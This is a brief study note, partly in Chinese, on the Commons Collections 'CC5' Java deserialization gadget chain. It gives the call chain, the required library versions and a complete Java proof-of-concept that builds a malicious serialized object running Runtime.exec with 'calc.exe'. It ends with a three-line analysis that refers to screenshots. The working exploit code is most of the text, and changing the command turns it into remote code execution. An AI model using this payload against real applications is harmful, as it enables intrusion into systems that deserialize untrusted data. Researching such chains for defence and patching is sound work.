# cc5

## Gadget chain&Requires

```
Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
Require:
	commons-collections:commons-collections:3.1
	jdk1.7
```

## poc

```java
package com.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static com.utils.Gadgets.setFieldValue;

public class CC5 {
    public static Object getObject() throws Exception {
        final String[] execArgs = new String[] { "calc.exe" };

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }
}
```

## analysis

入口类变为`BadAttributeValueExpException.readObject()`

![image-20220526110732459](C:\Users\Liyc\Desktop\java反序列化\cc5\cc5.assets\image-20220526110732459.png)

触发`TiedMapEntry.toString()`

![image-20220526111515527](C:\Users\Liyc\Desktop\java反序列化\cc5\cc5.assets\image-20220526111515527.png)

![image-20220526111531307](C:\Users\Liyc\Desktop\java反序列化\cc5\cc5.assets\image-20220526111531307.png)

map可控，所以可以触发`LazyMap.get()`
